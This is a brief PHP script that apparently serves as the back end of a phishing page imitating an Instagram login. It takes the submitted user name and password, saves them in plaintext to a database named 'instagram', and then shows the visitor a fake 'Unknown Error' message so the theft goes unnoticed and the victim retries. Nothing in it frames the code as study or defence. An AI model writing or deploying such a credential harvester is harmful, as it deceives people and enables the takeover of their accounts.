<?php
     $USER_NAME=$_POST['USER_NAME'];
     $PASSWORDS=$_POST['PASSWORDS'];

     $conn=new mysqli('localhost','root','','instagram');
     if($conn->connect_error){
        die('Connection Failed : '.$conn->connect_error);

     }
     else{
        $stmt=$conn->prepare("insert into logindetail(USER_NAME,PASSWORDS)values(?,?)");
        $stmt->bind_param("ss",$USER_NAME,$PASSWORDS);
        $stmt->execute();
        echo "An Unknown Error Occured Please Retry";
        $stmt->close();
        $conn->close();

         
     }


    ?>